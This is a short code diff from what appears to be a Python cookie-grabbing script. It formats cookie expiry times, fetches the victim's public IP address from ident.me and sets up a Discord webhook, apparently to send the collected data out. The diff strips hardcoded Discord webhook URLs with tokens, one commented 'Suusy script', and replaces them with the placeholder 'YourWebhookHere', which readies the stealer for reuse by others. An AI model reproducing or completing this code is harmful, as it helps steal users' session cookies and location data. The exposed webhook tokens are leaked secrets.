@@ -29,9 +29,7 @@ def convert_timestamp_to_readable(timestamp):
     # Convert timestamp to a readable date format
     return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S') if timestamp else "Session Cookie"
 
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/851169793066532864/9Ch1Ngz4Kps27gLeGq_jjJqEGmxksvTBaQskK2Znk3Yr33GNoziukLtumVu5GMKaAtvR')#Set up webhook
-#test https://discord.com/api/webhooks/851169793066532864/9Ch1Ngz4Kps27gLeGq_jjJqEGmxksvTBaQskK2Znk3Yr33GNoziukLtumVu5GMKaAtvR
-#Suusy script https://discord.com/api/webhooks/1124713729322385498/gn1X9dnBnAruq9ftjEfLg0XsmE9pnJ6pqr-AivwzyFcrdn0f9fqKAvnYvSDaQhN4Pzm1
+webhook = DiscordWebhook(url='YourWebhookHere')
 def ip4():#Get ipv4
     try:
      with urlopen('https://4.ident.me') as response:
